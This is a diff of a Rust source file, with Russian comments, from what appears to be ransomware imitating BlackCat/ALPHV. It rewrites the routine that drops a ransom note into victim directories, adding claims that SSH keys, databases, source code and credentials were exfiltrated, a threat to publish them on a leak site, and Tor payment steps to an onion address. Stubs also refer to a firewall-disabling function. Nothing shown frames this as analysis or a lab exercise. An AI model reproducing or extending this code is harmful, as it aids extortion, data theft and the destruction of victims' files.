@@ -1,3 +1,4 @@
+// src/linux.rs
 #[cfg(target_os = "linux")]
 use std::process::Command;
 
@@ -52,33 +53,40 @@ impl LinuxOperations {
 
     /// Создает записку с требованием выкупа в указанной директории (Linux-версия)
     #[cfg(target_os = "linux")]
-    pub fn create_ransom_note(directory: &str) -> Result<(), String> {
+    pub fn create_ransom_note(directory: &str, exfil_report: &str) -> Result<(), String> {
         let ransom_content = format!(
-r#"-->> Introduction
-Important files on your system was ENCRYPTED and now they have have "sttp" extension.
+r#"-->> BLACKCAT/ALPHV RANSOMWARE <<--
 
-In order to recover your files you need to follow instructions below.
-Sensitive Data
-Sensitive data on your system was DOWNLOADED and it will be PUBLISHED if you refuse to cooperate.
-Data includes:
+Your important files have been ENCRYPTED and now have ".sttp" extension.
+
+YOUR DATA HAS BEEN EXFILTRATED!
+All sensitive data from your system has been downloaded to our servers.
+This includes:
+- SSH keys and configuration
+- Database files
+- Web application source code
+- User documents and credentials
+
+If you refuse to pay, all data will be PUBLISHED on our leak site.
+
+EXFILTRATED DATA REPORT:
 {}
 
 CAUTION
 DO NOT MODIFY FILES YOURSELF.
-
 DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.
+YOU MAY DAMAGE YOUR FILES, RESULTING IN PERMANENT DATA LOSS.
+YOUR DATA IS STRONGLY ENCRYPTED WITH AES-256-GCM.
 
-YOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS.
+Recovery procedure:
+1. Download and install Tor Browser: https://torproject.org/
+2. Navigate to: http://blackcat-site.onion/
+3. Enter your personal decryption key
 
-YOUR DATA IS STRONGLY ENCRYPTED, YOU CAN NOT DECRYPT IT WITHOUT CIPHER KEY.
-Recovery procedure
-Follow these simple steps to get in touch and recover your data:
+Your decryption key will be provided after payment.
 
-Download and install Tor Browser from: https://torproject.org/
-Navigate to:
-http://blackcat-site.onion/?(ACCESS_KEY)"#,
-            directory
-        );
+=== DO NOT SHARE THIS KEY WITH ANYONE ===
+"#, exfil_report);
 
         let note_path = format!("{}/README_BLACKCAT.txt", directory);
         std::fs::write(&note_path, ransom_content)
@@ -87,7 +95,7 @@ http://blackcat-site.onion/?(ACCESS_KEY)"#,
         Ok(())
     }
 
-    // Заглушки для компиляции на других ОС (чтобы main.rs не выдавал ошибок)
+    // Заглушки для компиляции на других ОС
     #[cfg(not(target_os = "linux"))]
     pub fn disable_firewall() -> Result<(), String> {
         Err("Firewall disable only available on Linux".to_string())
@@ -104,7 +112,7 @@ http://blackcat-site.onion/?(ACCESS_KEY)"#,
     }
 
     #[cfg(not(target_os = "linux"))]
-    pub fn create_ransom_note(_directory: &str) -> Result<(), String> {
+    pub fn create_ransom_note(_directory: &str, _exfil_report: &str) -> Result<(), String> {
         Err("Ransom note creation only available on Linux".to_string())
     }
 }
